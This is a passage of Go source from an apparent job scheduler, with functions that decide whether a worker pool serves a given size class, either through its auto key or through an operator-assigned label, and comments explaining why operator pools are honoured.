	return head + fmt.Sprintf("was allowed on %s", to)
}

func needPhrase(floorMB int64) string {
	if floorMB <= 0 {
		return ""
	}
	return " (about " + formatMB(floorMB) + ")"
}

// servesClass reports whether an enabled pool answers the jobs routed to a class:
// the pool the controller keeps for it, or a pool an operator made that carries
// the class's label, which is the operator saying that pool is for that size.
//
// The second half matters because the controller makes no pool for a class an
// operator's pool already answers to -- it raises auto_pool.label_taken and
// leaves the class to them -- and a job routed there would otherwise be taken to
// have no pool and sent to a larger class, past the pool its own operator made
// for it, with a note saying no pool exists.
func servesClass(p *store.Pool, class store.SizeClass) bool {
	if p == nil || !p.Enabled {
		return false
	}
	if p.FromHosts() {
		_, k, ok := store.ParseAutoKey(p.AutoKey)
		return ok && k == class
	}
	return slices.ContainsFunc(p.Labels, func(l string) bool {
		k, ok := store.ClassOfLabel(l)
		return ok && k == class
	})
}

// servesAnyClass reports whether servesClass is true of a pool for some class.
func servesAnyClass(p *store.Pool) bool {
	for _, k := range store.SizeClasses() {
		if servesClass(p, k) {
			return true
		}
	}
	return false
}

package scheduler

